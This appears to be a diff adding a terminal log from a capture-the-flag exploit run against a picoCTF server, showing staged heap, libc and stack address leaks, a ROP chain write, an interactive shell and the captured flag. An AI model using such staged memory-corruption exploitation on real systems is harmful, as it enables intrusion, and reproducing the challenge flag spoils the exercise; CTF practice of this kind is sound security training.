@@ -1,0 +1,16 @@
+source venv/bin/activate
+python solve_hft_remote.py
+[+] Opening connection to tethys.picoctf.net on port 56635: Done
+[*] Stage 1: leaking heap
+[+] heap_leak = 0x5a120fef72b0
+[+] heap_base = 0x5a120fef7000
+[*] Stage 2: leaking libc
+[+] libc_leak = 0x7f67b14d1ce0
+[+] libc_base = 0x7f67b12b8000
+[*] Stage 3: leaking stack
+[+] stack_leak = 0x7ffd36088368
+[+] ret_addr   = 0x7ffd36088218
+[*] Stage 4: writing ROP chain
+[+] ROP enviado. Intentando leer flag...
+[*] Switching to interactive mode
+picoCTF{mm4p_mm4573r_8c30952a}
